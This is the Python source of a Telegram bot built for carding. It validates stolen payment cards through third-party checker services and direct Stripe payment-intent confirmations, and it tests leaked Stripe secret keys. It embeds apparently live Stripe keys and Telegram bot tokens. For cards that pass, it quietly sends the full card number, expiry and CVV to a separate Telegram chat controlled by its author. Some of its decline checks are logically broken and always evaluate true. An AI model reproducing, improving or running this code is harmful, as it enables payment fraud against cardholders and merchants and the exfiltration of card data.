import telebot
import re
from datetime import time , date , datetime
import time
import requests

tk = "5091216962:AAFH8KuDUek9SJ04LHz8d_r0cOdFrfgWL6o"
bot = telebot.TeleBot ( tk , parse_mode='HTML' )
li = ['1935904246' , '2019913786','-1001264846206','1369203062','1904810925','1220994613','-1001226749661','1586818213','1558927049','831085795']


@bot.message_handler ( commands=['start' , 'help'] )
def send_welcome ( message ) :
    bot.reply_to ( message , "click of /cmds" )


@bot.message_handler ( commands=['cmds'] )
def send_welcome ( message ) :
    bot.reply_to ( message , """
	<b>𝙒𝙀𝙇𝘾𝙊𝙈 𝙄𝙉 𝙐𝙎 𝘽𝙊𝙏</b>
	-------------------------
	/cc  -------> 𝙂𝙀𝙏 1   <b>Ｓｔｒｉｐ　Ａｕｔｈ </b>
	/stg -------> 𝙂𝙀𝙏 2 <b>Ｓｔｒｉｐ Ｃｈａｒｇｅ １＄</b>
	/st  -------> 𝙂𝙀𝙏 3 <b>Ｓｔｒｉｐ Ｃｈａｒｇｅ 3＄</b>
	/bin -------> 𝘾𝙃𝙀𝘼𝙆 𝘽𝙄𝙉
	/id  -------> 𝙂𝙀𝙏 𝙔𝙊𝙐𝙍 𝙄𝘿
	-----------------------
	𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣
	user: @N2K4N""" )


@bot.message_handler ( commands=['cc'] )
def snd_welcome ( message ) :
    ccu = message.text
    dd = message.text.split ( '|' )
    cc22 = dd[0]
    if cc22 != message.text :
        cc1 = ccu.split ( '/cc ' )[1]
        res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
        tt = re.match ( res , cc1 )
        if tt == None :
            bot.reply_to ( message , '<b> YOUR FORMAT WORNG</b>\n /cc  cc|ｍｍ|ｙｙ|ｃｖｖ' )
        else :
            yy = cc1.split ( '|' )
            cc = yy[0]
            mth = yy[1]
            ye = yy[2]
            cvv = yy[3]
            now = datetime.now ()
            xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
            url = f'https://lookup.binlist.net/{cc}'
            r = requests.get ( url ).text
            img = \
                r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[
                    1].split (
                    '","' )[0]
            shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚:\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
            tp = '|- 𝙏𝙔𝙋𝙀:\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
            lvel = '|- 𝙇𝙀𝙑𝙀𝙇:\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
            cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:\t' + \
                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
            date = '|-𝘿𝘼𝙏𝙀:\t' + str ( now ) + '\n'
            auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
            x = str ( message.chat.id )
            if x in li :
                idb = 'http://deadstripe.ngrok.io/Stripe/api.php?lista=' + cc1
                print ( idb )
                rr = requests.get ( idb ).text
                rps = rr.split ( '<span class="badge badge-Danger">' )[1].split ( '</span>' )[0]
                if 'Declined' or 'Card Doesnt Support Purchase' or "DEAD" or "Generic declined" or "#Declined" or "Your card number is incorrect." or "Your card was declined." or "stolen_card" in rr :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                else :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '|-𝘾𝘾 :\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    requests.post ( snd )
            else :
                y = "contact @N2k4n for allwed you"
                bot.reply_to ( message , y )
    else :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/cc  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )


@bot.message_handler ( commands=['bin'] )
def snd_welcome ( message ) :
    yy = message.text
    cc1 = yy.split ( '/bin' )[1]
    res = "^[\s]+[0-9]"
    tt = re.match ( res , cc1 )
    if tt == None :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/bin  BIN ''' )

    else :
        cc = cc1.split ( ' ' )[1]
        now = datetime.now ()
        url = f'https://lookup.binlist.net/{cc}'
        r = requests.get ( url ).text
        img = r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
            '","' )[0]
        shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚:\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
        tp = '|- 𝙏𝙔𝙋𝙀:\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
        lvel = '<i>|- 𝙇𝙀𝙑𝙀𝙇:\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
        cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:\t' + r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[
            0] + '\t' + img + '\n'
        bank = '|- 𝘽𝘼𝙉𝙆:\t' + r.split ( ',"bank":{"name":"' )[1].split ( '","' )[0] + '\n'
        date = '|-𝘿𝘼𝙏𝙀:\t' + str ( now ) + '\n'
        auther = '𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣'
        msg = '|-𝘽I𝙉 :\t' + cc[0] + cc[1] + cc[2] + cc[3] + cc[4] + cc[5] + cc[
            6] + '\n' + shm + tp + lvel + cont + bank + date + auther
        bot.reply_to ( message , msg )


@bot.message_handler ( commands=['id'] )
def send_welcome ( message ) :
    x = '''|-<b>𝙔𝙊𝙐𝙍 𝙄𝘿 𝙄𝙎:\t</b>   ''' + str ( message.chat.id ) + '\n𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣'

    bot.reply_to ( message , x )


@bot.message_handler ( commands=['stg'] )
def snd_welcome ( message ) :
    ccu = message.text
    dd = message.text.split ( '|' )
    cc22 = dd[0]
    if cc22 != message.text :
        cc1 = ccu.split ( '/stg ' )[1]
        res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
        tt = re.match ( res , cc1 )
        if tt == None :
            bot.reply_to ( message , '<b> YOUR FORMAT WORNG</b>\n /stg cc|ｍｍ|ｙｙ|ｃｖｖ' )
        else :
            yy = cc1.split ( '|' )
            cc = yy[0]
            mth = yy[1]
            ye = yy[2]
            cvv = yy[3]
            now = datetime.now ()
            xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
            url = f'https://lookup.binlist.net/{cc}'
            r = requests.get ( url ).text
            img = \
                r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[
                    1].split (
                    '","' )[0]
            shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚:\t' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
            tp = '|- 𝙏𝙔𝙋𝙀:\t' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
            lvel = '|- 𝙇𝙀𝙑𝙀𝙇:\t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
            cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔:\t' + \
                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
            date = '|-𝘿𝘼𝙏𝙀:\t' + str ( now ) + '\n'
            auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
            x = str ( message.chat.id )
            if x in li :
                idb = 'https://indianbinner.in/api/checker.php?lista=' + cc1 + '&sec=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'
                bot.reply_to ( message , "W8" )
                rr = requests.get ( idb ).text
                rps = rr.split ( '➜' )[1].split ( '➜ [ @IndianBinner 🦊]' )[0]
                if 'Generic Decline' in rr :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                elif 'Request rate limit exceeded.' or 'rate_limit' :
                    bot.reply_to ( message , "CHEAK YOUR PROXY ---/ Retry " )
                else :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b> ✅\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip Auth </b>' + '\n'
                    msg = '|-𝘾𝘾 :\t' + xx + shm + rps + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    requests.post ( snd )
            else :
                y = "contact @N2k4n for allwed you"
                bot.reply_to ( message , y )
    else :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/cc  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )


@bot.message_handler ( commands=['sk'] )
def snd_welcome ( message ) :
    yy = message.text
    cc1 = yy.split ( '/sk' )[1]
    res = "^[\s]+[sk_]+[A-Za-z0-9]"
    tt = re.match ( res , cc1 )
    if tt == None :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/sk  sk_live************** ''' )

    else :
        sk = cc1.split ( ' ' )[1]
        url = 'https://indianbinner.in/api/skchecker.php?lista=' + sk
        r = requests.get ( url ).text
        x = str ( message.chat.id )
        if x in li :
            if "Live" in r :
                bot.reply_to ( message , sk + '\n<b>LIVE ✅</b>\n 𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣' )
            else :
                bot.reply_to ( message , sk + '\n<b>DEAD ❌</b>\n 𝙗𝙤𝙩𝘽𝙮 : 𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣' )
        else :
            y = "contact @N2k4n for allwed you"
            bot.reply_to ( message , y )


@bot.message_handler ( commands=['st'] )
def snd_welcome ( message ) :
    ccu = message.text
    dd = message.text.split ( '|' )
    cc22 = dd[0]
    if cc22 != message.text :
        cc1 = ccu.split ( '/st ' )[1]
        res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
        tt = re.match ( res , cc1 )
        if tt == None :
            bot.reply_to ( message , '<b> YOUR FORMAT WORNG</b>\n /st cc|ｍｍ|ｙｙ|ｃｖｖ' )
        else :
            yy = cc1.split ( '|' )
            cc = yy[0]
            mth = yy[1]
            ye = yy[2]
            cvv = yy[3]
            now = datetime.now ()
            xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
            url = f'https://lookup.binlist.net/{cc}'
            r = requests.get ( url ).text
            img = \
            r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
                '","' )[0]
            shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚: ' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
            tp = '|- 𝙏𝙔𝙋𝙀: ' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
            lvel = '|- 𝙇𝙀𝙑𝙀𝙇:t' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
            cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: ' + \
                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
            date = '|-𝘿𝘼𝙏𝙀: ' + str ( now ) + '\n'
            auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
            x = str ( message.chat.id )
            if x in li :
                url2 = 'https://api.stripe.com/v1/payment_intents/pi_3K3nzkFgrf8fsEG40o8bSvRJ/confirm'
                data = {
                    'payment_method_data[type]' : 'card' ,
                    'payment_method_data[billing_details][name]' : 'Nihf kn' ,
                    'payment_method_data[card][number]' : cc ,
                    'payment_method_data[card][cvc]' : cvv ,
                    'payment_method_data[card][exp_month]' : mth ,
                    'payment_method_data[card][exp_year]' : ye ,
                    'payment_method_data[guid]' : 'ca62c621-8dfd-4344-aa27-f2564ccf36460a6ae6' ,
                    'payment_method_data[muid]' : '49b2ccf6-2a11-4f95-82c0-112520e240fa1b4600' ,
                    'payment_method_data[sid]' : 'b4016138-37ca-430c-952c-e055cef2ea961f1a46' ,
                    'payment_method_data[payment_user_agent]' : 'stripe.js/c6f2aaa66; stripe-js-v3/c6f2aaa66' ,
                    'payment_method_data[time_on_page]' : 48787 ,
                    'expected_payment_method_type' : 'card' ,
                    'use_stripe_sdk' : 'true' ,
                    'webauthn_uvpa_available' : 'false' ,
                    'spc_eligible' : 'false' ,
                    'key' : 'pk_live_51DJpRVFgrf8fsEG4rtqF6ifpKNLShxgXcQb8qeHFa9MkVw2LByShB4k4xeoKeBFLQ9FiIsFpAabZxUf9zqCD8VEs00hqtoFyUg' ,
                    'client_secret' : 'pi_3K3nzkFgrf8fsEG40o8bSvRJ_secret_coKVEZEgejvjV3tUFe5V1uLLd' ,
                }
                headers = {
                    'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' ,
                }
                bot.reply_to ( message , "-----please W8 ----- " )
                rr = requests.post ( url2 , data=data , headers=headers )
                get = rr.text
                msge = get.split ( '"message": "' )[1].split ( '",' )[0]
                code = get.split ( 'code": "' )[1].split ( '",' )[0]
                if 'declined' or 'bank_account_declined' or 'bank_account_exists' or 'bank_account_unusable' or 'card_decline_rate_limit_exceeded' or 'card_declined' or 'charge_already_captured' or 'charge_already_refunded' or 'expired_card' or 'incorrect_cvc' or 'incorrect_number' or 'invalid_expiry_month' or 'invalid_expiry_year' or 'invalid_number' or 'lock_timeout' or 'parameter_missing' or 'payment_method_bank_account_already_verified' or 'payment_method_bank_account_blocked' or 'payment_method_invalid_parameter' or 'payment_method_unsupported_type' in get :
                    if 'Your card has insufficient funds.' in msge :
                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                            message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 3$</b>' + '\n'
                        status = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
                        msg = '-𝘾𝘾 : ' + xx + status + rps + rp + shm + tp + lvel + cont + us + date + auther
                        bot.reply_to ( message , msg )
                        snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    else :
                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                            message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>❌\n'
                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 3$</b>' + '\n'
                        msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                        bot.reply_to ( message , msg )
                else :
                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>✅\n'
                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 3$</b>' + '\n'
                    msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                    bot.reply_to ( message , msg )
                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                    requests.post ( snd )
            else :
                y = " contact @N2k4n for allwed you!"
                bot.reply_to ( message , y )
    else :
        bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
/st  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )


bot.infinity_polling ()
